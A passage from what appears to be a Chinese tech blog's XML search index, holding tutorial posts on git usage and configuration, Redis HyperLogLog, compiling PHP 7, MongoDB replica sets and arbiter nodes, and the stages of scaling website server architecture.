所有配置文件可以直接在线浏览：https://github.com/github/gitignore忽略文件的原则是：忽略操作系统自动生成的文件，比如缩略图等；忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的.class文件；忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。 举个例子：假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件.如果有自定义目录，目录下就会有Desktop.ini文件.因此你需要忽略Windows自动生成的垃圾文件：Windows:Thumbs.db ehthumbs.db Desktop.ini然后，继续忽略Python编译产生的.pyc、.pyo、dist等文件或目录：Python: *.py[cod] *.so *.egg *.egg -info dist build加上你自己定义的文件，最终得到一个完整的.gitignore文件.内容如下 # Windows:Thumbs.db ehthumbs.db Desktop.ini Python:.py[cod] .so .egg .egg-info dist buildMy configurations:db.ini deploy_key_rsa&nbsp; 最后一步就是把.gitignore**也提交到Git**，就完成了！ 当然检验.gitignore的标准是git status命令是不是说working directory clean。使用Windows的童鞋注意了，如果你在资源管理器里新建一个.gitignore文件，它会非常弱智地提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为.gitignore了。小结忽略某些文件时，需要编写.gitignore；.gitignore文件本身要放到版本库里，并且可以对.gitignore做版本管理！ 配置别名我们只需要敲一行命令，告诉Git，以后st就表示status： $ git config –global alias.st status$ git config –global alias.co checkout$ git config –global alias.ci commit$ git config –global alias.br branch&nbsp; 以后提交就可以简写成：$ git ci -m “bala bala bala…” . –global参数是全局参数，也就是这些命令在这台电脑的所有Git仓库下都有用。 在撤销修改一节中，我们知道，命令git reset HEAD file可以把暂存区的修改撤销掉（unstage），重新放回工作区。既然是一个unstage操作，就可以配置一个unstage别名：$ git config –global alias.unstage ‘reset HEAD’当你敲入命令：$ git unstage test.py实际上Git执行的是：$ git reset HEAD test.py配置一个git last，让其显示最后一次提交信息：$ git config –global alias.last ‘log -1′这样，用git last就能显示最近一次的提交： $ git last commit adca45d317e6d8a4b23f9811c3d7b7f0f180bfe2Merge: bd6ae48 291bea8Author: Michael LiaoDate: Thu Aug 22 22:49:22 2013 +0800merge &amp; fix hello.py&nbsp; 甚至还有人丧心病狂地把lg配置成了：git config –global alias.lg “log –color –graph –pretty=format:’%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset’ –abbrev-commit” 配置文件配置Git的时候，加上–global是针对当前用户起作用的，电脑下所有库都起作用；如果不加，那只针对当前的仓库起作用。 配置文件放哪了？每个仓库的Git配置文件都放在.git/config文件中： $ cat .git/config[core] repositoryformatversion = 0filemode = truebare = falselogallrefupdates = trueignorecase = trueprecomposeunicode = true[remote “origin”]url = git@github.com:michaelliao/learngit.gitfetch = +refs/heads/:refs/remotes/origin/[branch “master”]remote = originmerge = refs/heads/master[alias] last = log -1&nbsp; 别名就在[alias]后面，要删除别名，直接把对应的行删掉即可。 而当前用户的Git配置文件放在用户主目录下的一个隐藏文件.gitconfig中：Git的官方网站：http://git-scm.com，英文自我感觉不错的童鞋，可以经常去官网看看]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[git常用命令一]]></title>
      <url>%2F2017%2F02%2F08%2Fgit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%B8%80%2F</url>
      <content type="text"><![CDATA[1. 安装 Github 查看是否安装git: $ gitThe program ‘git’ is currently not installed.You can install it by typing: sudo apt-get install git&nbsp; 安装git命令：sudo apt-get install git （cenos使用yum install） &nbsp; 安装完成后，还需要最后一步设置，在命令行输入： $ git config –global user.name “Your Name”$ git config –global user.email “[email@example.com]”&nbsp; 因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。你也许会担心，如果有人故意冒充别人怎么办？这个不必担心，首先我们相信大家都是善良无知的群众，其次，真的有冒充的也是有办法可查的。注意git config 命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。 2. 创建版本库 创建一个版本库非常简单，首先，选择一个合适的地方，创建一个空目录： $ mkdir learngit&nbsp; $ cd learngit$git initInitialized empty Git repository in /Users/michael/learngit/.git/瞬间Git就把仓库建好了，而且告诉你是一个空的仓库（empty Git repository），细心的读者可以发现当前目录下多了一个.git的目录，这个目录是Git来跟踪管理版本库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把Git仓库给破坏了。 3. 把文件添加到版本库 首先这里再明确一下，所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。 版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。 不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。 现在我们编写一个readme.txt文件，内容如下： Git is a version control system. Git is free software.一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git再厉害也找不到这个文件。 把一个文件放到Git仓库只需要两步:第一步，用命令git add告诉Git，把文件添加到仓库： $ git add readme.txt&nbsp; 执行上面的命令，没有任何显示，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。第二步，用命令git commit告诉Git，把文件提交到仓库： $ git commit -m “wrote a readme file”[master (root-commit) cb926e7] wrote a readme file 1 file changed, 2 insertions(+)create mode 100644 readme.txt&nbsp; 简单解释一下git commit命令: -m后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样你就能从历史记录里方便地找到改动记录。 git commit命令执行成功后会告诉你，1个文件被改动（我们新添加的readme.txt文件），插入了两行内容（readme.txt有两行内容）。 为什么Git添加文件需要add，commit一共两步呢？因为commit可以一次提交很多文件，所以你可以多次add不同的文件，比如： $ git add file1.txt$ git add file2.txt file3.txt$ git commit -m “add 3 files.”&nbsp; git status命令可以让我们时刻掌握仓库当前的状态，上面的命令告诉我们，readme.txt被修改过了，但还没有准备提交的修改。 $ git status #On branch master Changes not staged for commit: ———-add之前，变化还没进入暂存区；(use “git add …” to update what will be committed)(use “git checkout – …” to discard changes in working directory)modified: readme.txt —此文件被修改# Untracked files: —–此文件是新的，以前从未被提交过；(use “git add …” to include in what will be committed)LICENSE&nbsp; 虽然Git告诉我们readme.txt被修改了，但如果能看看具体修改了什么内容，自然是很好的。比如你休假两周从国外回来，第一天上班时，已经记不清上次怎么修改的readme.txt，所以，需要用git diff这个命令看看。 git diff顾名思义就是查看difference，显示的格式正是Unix通用的diff格式。 $ git diff readme.txtdiff –git a/readme.txt b/readme.txtindex 46d49bf..9247db6 100644 — a/readme.txt +++ b/readme.txt @@ -1,2 +1,2 @@ -Git is a version control system. –这一句没了+Git is a distributed version control system. — 这一句是新加的 Git is free software. –这一句是原来就有的&nbsp; 先把大量文件一次性add进来：git add *.py，然后你用git status查看，会有提示： $git statusChanges to be committed:(use “git reset HEAD …” to unstage) new file: 1.py new file: 2.py new file: 3.py new file: 4.py&nbsp; 要排除掉其中一个文件，用:git reset HEAD 1.py这时再用git status看，1.py变成了untracked，剩下的就可以提交了。 4，版本回退 在实际工作中，我们脑子里怎么可能记得一个几千行的文件每次都改了什么内容，不然要版本控制系统干什么。 版本控制系统肯定有某个命令可以告诉我们历史记录，在Git中，我们用git log命令查看；git log命令显示从最近到最远的提交日志，我们可以看到3次提交，最近的一次是append GPL，上一次是add distributed，最早的一次是wrote a readme file。 首先，Git必须知道当前版本是哪个版本，在Git中，用HEAD表示当前版本，也就是最新的提交3628164…882e1e0（注意:我的提交ID和你的肯不一在Git中），上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。 现在，我们要把当前版本“append GPL”回退到上一个版本“add distributed”，就可以使用git reset命令： $ git re**set–hard HEAD^**HEAD is now at ea34578 add distributed&nbsp; $ cat readme.txt 查看当前版本下，文件的内容； Git is a distributed version control system. Git is free software.然我们用git log再看看现在版本库的状态：最新的那个版本append GPL已经看不到了；想再回去已经回不去了，肿么办？办法其实还是有的，只要上面的命令行窗口还没有被关掉，你就可以顺着往上找啊找啊，找到那个append GPL的commit id是3628164…，于是就可以指定回到未来的某个版本： $ git re set –hard 3628164**HEAD is now at 3628164 append GPL&nbsp; 版本号没必要写全，前几位就可以了，Git会自动去找。当然也不能只写前一两位，因为Git可能会找到多个版本号，就无法确定是哪一个了。在Git中，总是有后悔药可以吃的。当你用$ git reset --hard HEAD^回退到add distributed版本时，再想恢复到append GPL，就必须找到append GPL的commit id。Git提供了一个命令git reflog用来记录你的每一次命令：$ git reflog $ git reflogea34578 HEAD@{0}: reset: moving to HEAD^3628164HEAD@{1}: commit: append GPLea34578HEAD@{2}: commit: add distributedcb926e7HEAD@{3}: commit (initial): wrote a readme file&nbsp; 5. 工作区和暂存区 Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念。先来看名词解释:工作区（Working Directory）就是你在电脑里能看到的目录，比如我的syzgit文件夹就是一个工作区.版本库（Repository）工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支master，以及指向master的一个指针叫HEAD。 git-repo分支和HEAD的概念我们以后再讲。前面讲了我们把文件往Git版本库里添加的时候，是分两步执行的：第一步是用git add –&gt; 把文件添加进去，实际上就是把文件修改添加到暂存区第二步是用git commit –&gt; 提交更改，实际上就是把暂存区的所有内容提交到当前分支。 因为我们创建Git版本库时，Git自动为我们创建了唯一一个master分支，所以，现在，git commit就是往master分支上提交更改。你可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。 6，管理修改，撤销修改，删除文件 为什么Git比其他版本控制系统设计得优秀，因为Git跟踪并管理的是修改，而非文件。你会问，什么是修改？比如你新增了一行，这就是一个修改，删除了一行，也是一个修改，更改了某些字符，也是一个修改，删了一些又加了一些，也是一个修改，甚至创建一个新文件，也算一个修改。 Git管理的是修改，当你用git add命令后，在工作区的第一次修改被放入暂存区，准备提交，但是文件又被修改一次，在工作区的第二次修改并没有放入暂存区，所以此时直接用git commit只负责把暂存区的修改提交了，也就是第一次的修改被提交了，第二次的修改不会被提交。 那怎么提交第二次修改呢？你可以继续git add再git commit，也可以别着急提交第一次修改，先git add第二次修改，再git commit，就相当于把两次修改合并后一块提交了： 第一次修改 -&gt; git add-&gt; 第二次修改 -&gt; git add -&gt; git commit $ git status On branch masterChanges not staged for commit: — add之前(use “git add …” to update what will be committed)(use “git checkout – …” to discard changes in working directory)# modified: readme.txt&nbsp; Git会告诉你，git checkout – file 可以丢弃工作区的修改： $ git checkout – readme.txt 撤销工作区的修改 回到 暂存区/库版本命令git checkout – readme.txt意思就是，把readme.txt文件在工作区的修改全部撤销，这里有两种情况： 一种是readme.txt自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态； 一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。总之，就是让这个文件回到最近一次git commit或git add时的状态。 git checkout – file命令中的–很重要，没有–，就变成了“创建一个新分支”的命令，我们在后面的分支管理中会再次遇到git checkout命令。 Git同样告诉我们，用命令git reset HEAD file，撤销暂存区的修改掉（unstage），重新放回工作区git reset命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用HEAD时表示最新的版本。 场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令git checkout – file。 场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令git reset HEAD file，就回到了场景1，第二步按场景1操作。 场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。Git知道你删除了文件，因此，工作区和版本库就不一致了，git status命令会立刻告诉你哪些文件被删除了： $ git status On branch masterChanges not staged for commit:(use “git add/rm …” to update what will be committed)(use “git checkout – …” to discard changes in working directory)deleted: test.txt#no changes added to commit (use “git add” and/or “git commit -a”)&nbsp; 现在你有两个选择，一是确实要从版本库中删除该文件，那就用命令git rm删掉，并且git commit： $ git rm test.txt$ git commit -m “remove test.txt”[master d17efd8] remove test.txt 1 file changed, 1 deletion(-) delete mode 100644 test.txt&nbsp; 现在，文件就从版本库中被删除了。 另一种情况是删错了，因为版本库里还有呢，所以可以很轻松地把误删的文件恢复到最新版本： $ git checkout – test.txt git checkout其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以“一键还原”。 命令git rm用于删除一个文件。如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失**最近一次提交后你修改的内容。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Redis之HyperLogLog]]></title>
      <url>%2F2017%2F01%2F24%2Fredis%E4%B9%8Bhyperloglog%2F</url>
      <content type="text"><![CDATA[HyperLogLog，数据统计去重处理的神器之一，应用内存管理，实时计算，快速统计网站独立ip，uv等等。 –卧兹基硕德（我自己说的） redis HyperLogLog 是用来做基数统计的算法，HyperLogLog 的优点是，在输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定 的、并且是很小的。 在 Redis 里面，每个 HyperLogLog 键只需要花费 12 KB 内存，就可以计算接近 2^64 个不同元素的基 数。这和计算基数时，元素越多耗费内存就越多的集合形成鲜明对比。 但是，因为 HyperLogLog 只会根据输入元素来计算基数，而不会储存输入元素本身，所以 HyperLogLog 不能像集合那样，返回输入的各个元素。 &nbsp; 什么是基数?比如数据集 {1, 3, 5, 7, 5, 7, 8}， 那么这个数据集的基数集为 {1, 3, 5 ,7, 8}, 基数(不重复元素)为5。 基数估计就是在误差可接受的范围内，快速计算基数。 &nbsp; 接下来举个栗子。。。 我们把每日IP记录下来，假设每天有一亿个IP访问，如果使用集合的话，一天的内存使用就是1.5G，假设我们存储一个月的记录，就需要45G容量。但是使用HyperLogLog的话，一天12K，一个月360K。如果我们不需要知道IP具体信息的话，完全可以把这些记录留在内存一年、或者不删都行。如果需要，我们也会把所有的IP访问记录通过其他途径存储起来。把每天的信息存储起来，我们可以计算每月IP总数（MERGE），一年的IP总数等（去重）。 &nbsp; 最后具体操作方法 1)将元素添加至 HyperLogLog PFADD key element [element …]将任意数量的元素添加到指定的 HyperLogLog 里面。这个命令可能会对 HyperLogLog 进行修改，以便反映新的基数估算值，如果 HyperLogLog 的基数估算值在命令执行之后出现了变化， 那么命令返回 1 ， 否则返回 0 。命令的复杂度为 O(N) ，N 为被添加元素的数量。 返回给定 HyperLogLog 的基数估算值PFCOUNT key [key …]当只给定一个 HyperLogLog 时，命令返回给定 HyperLogLog 的基数估算值。当给定多个 HyperLogLog 时，命令会先对给定的 HyperLogLog 进行并集计算，得出一个合并后的HyperLogLog ，然后返回这个合并 HyperLogLog 的基数估算值作为命令的结果（合并得出的HyperLogLog 不会被储存，使用之后就会被删掉）。当命令作用于单个 HyperLogLog 时， 复杂度为 O(1) ， 并且具有非常低的平均常数时间。当命令作用于多个 HyperLogLog 时， 复杂度为 O(N) ，并且常数时间也比处理单个 HyperLogLog 时要大得多。 &nbsp; 2)PFADD 和 PFCOUNT 的使用示例redis&gt; PFADD unique::ip::counter &#39;192.168.0.1&#39;(integer) 1redis&gt; PFADD unique::ip::counter &#39;127.0.0.1&#39;(integer) 1redis&gt; PFADD unique::ip::counter &#39;255.255.255.255&#39;(integer) 1redis&gt; PFCOUNT unique::ip::counter(integer) 3 3)合并多个 HyperLogLog****PFMERGE destkey sourcekey [sourcekey …]将多个 HyperLogLog 合并为一个 HyperLogLog ，合并后的 HyperLogLog 的基数估算值是通过对所有给定 HyperLogLog 进行并集计算得出的。命令的复杂度为 O(N) ， 其中 N 为被合并的 HyperLogLog 数量， 不过这个命令的常数复杂度比较高。 PFMERGE 的使用示例redis&gt; PFADD str1 &quot;apple&quot; &quot;banana&quot; &quot;cherry&quot;(integer) 1redis&gt; PFCOUNT str1(integer) 3redis&gt; PFADD str2 &quot;apple&quot; &quot;cherry&quot; &quot;durian&quot; &quot;mongo&quot;(integer) 1redis&gt; PFCOUNT str2(integer) 4redis&gt; PFMERGE str1&amp;2 str1 str2OKredis&gt; PFCOUNT str1&amp;2(integer) 5 此功能对网站统计的需求可以得心应手，放手去gank！ Let’s go, don’t worry about anything!&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP7的安装以及注意点]]></title>
      <url>%2F2017%2F01%2F23%2Fphp7%E7%9A%84%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E6%B3%A8%E6%84%8F%E7%82%B9%2F</url>
      <content type="text"><![CDATA[一、首先下载 进入PHP官网：http://php.net/downloads.php，寻找最新稳定版本 &nbsp; 下载你选择的版本 cd ~wget http://cn2.php.net/get/php-7.1.1.tar.gz/from/this/mirror&nbsp; 二、安装 tar –zxvf php-7.1.1.tar.gzcd php-7.1.1&nbsp; 为了不影响原有php版本，编译指定目录到/usr/local/php7 下，如下并且带上所需的php扩展 ./configure –prefix=/usr/local/php7 –with-config-file-path=/usr/local/php7/etc –with-mcrypt=/usr/include –with-mysql=mysqlnd –with-mysqli=mysqlnd –with-pdo-mysql=mysqlnd–with-gd –with-iconv –with-zlib –enable-xml –enable-bcmath –enable-shmop –enable-sysvsem –enable-inline-optimization –enable-mbregex –enable-fpm –enable-mbstring –enable-ftp–enable-gd-native-ttf –with-openssl –enable-pcntl –enable-sockets –with-xmlrpc –enable-zip –enable-soap –without-pear –with-gettext –enable-session –with-curl –with-jpeg-dir–with-freetype-dir –enable-opcache&nbsp; 然后开始编译安装，中间时间可能会比较长 make #注：如果出现make: * [sapi/cli/php] error 1 #则继续执行下面语句，如果没有则不用make ZEND_EXTRA_LIBS=’-liconv’make install&nbsp; 如果一切顺利，应该就已经安装完毕 另外由于需要一些配置，复制一些配置文件 cp php.ini-production /usr/local/php7/etc/php.inicp /usr/local/php7/etc/php-fpm.conf.default /usr/local/php7/etc/php-fpm.confcp /usr/local/php7/etc/php-fpm.d/www.conf.default /usr/local/php7/etc/php-fpm.d/www.conf&nbsp; 为了避免出现端口冲突，需要找到listen，修改监听的端口号为9001（或其他没有被占用的端口号） vim /usr/local/php7/etc/php-fpm.d/www.conf–&gt;listen = 127.0.0.1:9001&nbsp; 为了方便操作，进行一些最后的配置 cp /etc/init.d/php-fpm /etc/init.d/php7&nbsp; 编辑修改： vim /etc/init.d/php7&nbsp; 找到 prefix=/usr/local/php&nbsp; 改为 prefix=/usr/local/php7&nbsp; 然后就可以使用service命令了 service php7 restart&nbsp; 最后的最后,追求更加便捷^^（其实就是懒） cp /usr/local/php7/bin/php /usr/bin/php7&nbsp; 因为属于新安装的PHP程序，所以很多旧版本的扩展都不一定支持PHP7，例如phpredis就需要去社区下载专门的PHP7版本的扩展，当然万能的github上会有更多版本 还有一点要注意就是mongodb的扩展，php7已经废弃了原来的mongo扩展，目前只支持mongdb的扩展，个人感觉是很繁琐的，有时间会出个文章介绍下。 同样的代码，放到PHP7里面大概提高近一倍的效率，尤其是针对文件操作方面。 php7的性能绝对可以double，trust me！！！ &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MongDB之仲裁节点]]></title>
      <url>%2F2017%2F01%2F23%2Fmongdb%E4%B9%8B%E4%BB%B2%E8%A3%81%E8%8A%82%E7%82%B9%2F</url>
      <content type="text"><![CDATA[之前搭建mongo副本集时，好多地方提到了仲裁节点的概念，说的云里雾里，后来去我大知乎看下找到了满意的答案&gt; https://www.zhihu.com/question/27648448总结俩点就是1. 为什么使用奇数个数成员？假设一种场景，偶数8节点，IDC网络故障发生分裂，,这两个分裂后的IDC各持有4个节点，因为投票数未超过半数，所以无法选举出新Primary。2. 仲裁节点作用？仲裁节点并不需要太多系统资源，也并不持有数据本身，而是参与投票。投票选举机制，根据数据最后操作、更新时间戳等判定，若有两方都为最新，且票数相等，此环节需要等待若干分钟。 仲裁节点打破这个僵局总之就是集群切换时方便选出Primary节点下面来说下仲裁节点的设置仲裁节点不持有数据，所以可以在集群节点中的一台再加个端口多开一台，但是目录要配置不同如下 mongod.conf&gt; dbpath=/data/mongodb/db/&gt;&gt; logpath=/data/mongodb/log/mongodb.log&gt;&gt; pidfilepath=/usr/local/mongodb/run/mongodb.pid&gt;&gt; #bind_ip=172.21.1.60&gt;&gt; fork=true&gt;&gt; directoryperdb=true&gt;&gt; logappend=true&gt;&gt; replSet=dcclog&gt;&gt; port=27017&gt;&gt; #oplogSize=10000&gt;&gt; noprealloc=true mongd_1.conf&gt; dbpath=/data/mongodb_1/db/ #path&gt;&gt; logpath=/data/mongodb_1/log/mongodb.log #loh&gt;&gt; pidfilepath=/usr/local/mongodb/run_1/mongodb.pid #pid&gt;&gt; #bind_ip=172.21.1.60&gt;&gt; fork=true&gt;&gt; directoryperdb=true&gt;&gt; logappend=true&gt;&gt; replSet=dcclog&gt;&gt; #bind_ip=10.10.148.132&gt;&gt; port=27018#端口更换&gt;&gt; oplogSize=10000&gt;&gt; noprealloc=true&gt;&gt; arbiterOnly = true #仲裁然后启动时执行&gt;/usr/local/mongodb/bin/mongod -f /usr/local/mongodb/etc/mongod.conf&gt;/usr/local/mongodb/bin/mongod -f /usr/local/mongodb/etc/mongod_1.conf]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MongoDB搭建副本集]]></title>
      <url>%2F2017%2F01%2F23%2Fmongodb%E6%90%AD%E5%BB%BA%E5%89%AF%E6%9C%AC%E9%9B%86%2F</url>
      <content type="text"><![CDATA[MongoDB 复制（副本集）MongoDB复制是将数据同步在多个服务器的过程。 复制提供了数据的冗余备份，并在多个服务器上存储数据副本，提高了数据的可用性， 并可以保证数据的安全性。 复制还允许您从硬件故障和服务中断中恢复数据。 什么是复制? 保障数据的安全性 数据高可用性 (24*7) 灾难恢复 无需停机维护（如备份，重建索引，压缩） 分布式读取数据 MongoDB复制原理mongodb的复制至少需要两个节点。其中一个是主节点，负责处理客户端请求，其余的都是从节点，负责复制主节点上的数据。 mongodb各个节点常见的搭配方式为：一主一从、一主多从。 主节点记录在其上的所有操作oplog，从节点定期轮询主节点获取这些操作，然后对自己的数据副本执行这些操作，从而保证从节点的数据与主节点一致。 MongoDB复制结构图如下所示： 以上结构图总，客户端总主节点读取数据，在客户端写入数据到主节点是， 主节点与从节点进行数据交互保障数据的一致性。 副本集特征： N 个节点的集群 任何节点可作为主节点 所有写入操作都在主节点上 自动故障转移 自动恢复&nbsp; 副本集配置文件搭建 [plain] view plaincopy #arbiter.confdbpath=/mongodb/data/arbiterlogpath=/mongodb/log/arbiter.logpidfilepath=/mongodb/arbiter.piddirectoryperdb=truelogappend=truereplSet=testrs #bind_ip=192.168.56.14port=27017oplogSize=10000fork=truenoprealloc=true 参数解释： dbpath：数据存放目录 logpath：日志存放路径 pidfilepath：进程文件，方便停止mongodb directoryperdb：为每一个数据库按照数据库名建立文件夹存放 logappend：以追加的方式记录日志 replSet：replica set的名字 bind_ip：mongodb所绑定的ip地址 port：mongodb进程所使用的端口号，默认为27017 oplogSize：mongodb操作日志文件的最大大小。单位为Mb，默认为硬盘剩余空间的5% fork：以后台方式运行进程 noprealloc：不预先分配存储 &nbsp; 接下来找到对应的启动配置及服务应用 /usr/local/mongodb/bin/mongod -f /usr/local/mongodb/etc/mongod.conf 最好启动奇数台机器，如果为偶数台机器，请参考仲裁节点 然后进入其中一台机器 添加启动ip及对应的端口 然后执行 rs.status()查看状态 遇见报错 启动不成功，查看日志文件 tail -f /data/mongodb/log/mongdb.log发现如下问题 好多报错，大概的意思是存储引擎冲突巴拉巴拉。。。 这是因为可能你的集群节点中有有数据的，并且 directoryperdb没有设置是默认值false，原来数据存储不是按文件夹存储的，如果一定要设为true的话 ， 找到你配置mongo的数据库存储目录 备份清空，就万事大吉了，坑了好久，网上都是水帖。 还有可能出现的问题 Error: error: { “ok” : 0, “errmsg” : “not master and slaveOk=false”, “code” : 13435 } 原因：这是因为从节点无法读写 解决：执行命令: rs.slaveOk(); &nbsp; 感谢大家，欢迎转载 &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[循序渐进完善网站服务器架构]]></title>
      <url>%2F2017%2F01%2F21%2F%E5%BE%AA%E5%BA%8F%E6%B8%90%E8%BF%9B%E5%AE%8C%E5%96%84%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84%2F</url>
      <content type="text"><![CDATA[1. 初始阶段的网站架构一般来讲，大型网站都是从小型网站发展而来，一开始的架构都比较简单，随着业务复杂和用户量的激增，才开始做很多架构上的改进。当它还是小型网站的时候，没有太多访客，一般来讲只需要一台服务器就够了，这时应用程序、数据库、文件等所有资源都在一台服务器上，网站架构如下图所示：2. 应用服务和数据服务分离随着网站业务的发展和用户量的增加，一台服务器就无法再满足需求了。大量用户访问导致访问速度越来越慢，而逐渐增加的数据也会导致存储空间不足。这时就需要将应用和数据分离，应用和数据分离后整个网站使用 3 台服务器：应用服务器、文件服务器和数据库服务器。这 3 台服务器对硬件资源的要求各不相同： 应用服务器业务逻辑，需要强大的CPU 数据库服务器对磁盘读写操作很多，需要更快的磁盘和更大的内存 文件服务器存储用户上传的文件，因此需要更大的磁盘空间此时，网站系统的架构如下图所示：3. 使用缓存改善网站性能随着用户再增加，网站又会一次面临挑战：数据库压力太大导致整站访问效率再此下降，用户体验受到影响。一个网站，往往 80% 的业务访问集中在 20% 的数据上，比如微博请求量最多的肯定是那些千万级粉丝的大 V 的微博，而几乎没有人关注的你的首页，除了自己想起来之外根本不会被打开。既然大部分业务访问集中在一小部分数据上，那就把这一小部分数据先提前缓存在内存中，而不是每次都去数据库读取，这样就可以减少数据库的访问压力，从而提高整个网站的访问速度。网站使用的缓存一般分为缓存到应用服务器或者缓存在专门的分布式缓存服务器。缓存到应用服务器自己的访问速度快很多，但是受自身内存限制，往往不太适用。远程分布式缓存使用一个集群专门负责缓存服务，当内存不够还可以轻松得动态扩容。4. 使用应用服务器集群改善网站的并发处理能力使用缓存后，数据访问压力得到了缓解，但是单一应用服务器能够处理的请求连接有限，在网站访问高峰期，应用服务器就成了整个网站的效率瓶颈。使用分布式集群是网站解决高并发、海量数据问题的常用手段。当一台服务器的处理能力和存储空间不足时，不要尝试去更换更强大的服务器，对大型网站而言，多么强大的服务器，都满足不了网站持续增长的业务需求。这种情况下，更恰当的做法是增加一台服务器分担原有服务器的访问及存储压力。 对网站架构而言，只要能通过增加一台服务器的方式改善负载压力，就可以以同样的方式持续增加服务器不断改善系统性能，从而实现系统的可伸缩性。应用服务器实现集群是网站可伸缩架构设计中较为简单成熟的一种，如下图所示：通过负载均衡调度服务器，可以将来自用户浏览器的访问请求分发到应用服务器集群中的任何一台服务器上，如果有更多用户，就在集群中加入更多的应用服务器，使应用服务器的压力不再成为整个网站的瓶颈。5. 数据库读写分离网站在使用缓存后，使对大部分数据读操作访问都可以不通过数据库就能完成，但是仍有一部分读操作（缓存访问不命中、缓存过期）和全部的写操作都需要访问数据库，在网站的用户达到一定规模后，数据库因为负载压力过高而成为网站的瓶颈。 目前大部分的主流数据库都提供主从热备功能，通过配置两台数据库主从关系，可以将一台数据库服务器的数据更新同步到另一台服务器上。网站利用数据库的这一功能，实现数据库读写分离，从而改善数据库负载压力。如下图所示：应用服务器在写数据的时候，访问主数据库，主数据库通过主从复制机制将数据更新同步到从数据库，这样当应用服务器读数据的时候，就可以通过从数据库获得数据。为了便于应用程序访问读写分离后的数据库，通常在应用服务器端使用专门的数据访问模块，使数据库读写分离对应用透明。6. 使用反向代理和 CDN 加速网站响应随着网站业务不断发展，用户规模越来越大，由于中国复杂的网络环境，不同地区的用户访问网站时，速度差别也极大。有研究表明，网站访问延迟和用户流失率正相关，网站访问越慢，用户越容易失去耐心而离开。为了提供更好的用户体验，留住用户，网站需要加速网站访问速度。主要手段有使用 CDN 和反向代理。如下图所示：7. 使用分布式文件系统和分布式数据库系统任何强大的单一服务器都满足不了大型网站持续增长的业务需求。数据库经过读写分离后，从一台服务器拆分成两台服务器，但是随着网站业务的发展依然不能满足需求，这时需要使用分布式数据库。文件系统也一样，需要使用分布式文件系统。如下图所示：分布式数据库是网站数据库拆分的最后手段，只有在单表数据规模非常庞大的时候才使用。不到不得已时，网站更常用的数据库拆分手段是业务分库，将不同业务的数据部署在不同的物理服务器上。8. 使用 NoSQL 和搜索引擎随着网站业务越来越复杂，对数据存储和检索的需求也越来越复杂，网站需要采用一些非关系数据库技术如 NoSQL 和非数据库查询技术如搜索引擎。如下图所示：NoSQL 和搜索引擎都是源自互联网的技术手段，对可伸缩的分布式特性具有更好的支持。应用服务器则通过一个统一数据访问模块访问各种数据，减轻应用程序管理诸多数据源的麻烦。9. 业务拆分大型网站为了应对日益复杂的业务场景，通过使用分而治之的手段将整个网站业务分成不同的产品线。如大型购物交易网站都会将首页、商铺、订单、买家、卖家等拆分成不同的产品线，分归不同的业务团队负责。具体到技术上，也会根据产品线划分，将一个网站拆分成许多不同的应用，每个应用独立部署。应用之间可以通过一个超链接建立关系（在首页上的导航链接每个都指向不同的应用地址），也可以通过消息队列进行数据分发，当然最多的还是通过访问同一个数据存储系统来构成一个关联的完整系统，如下图所示：*10. 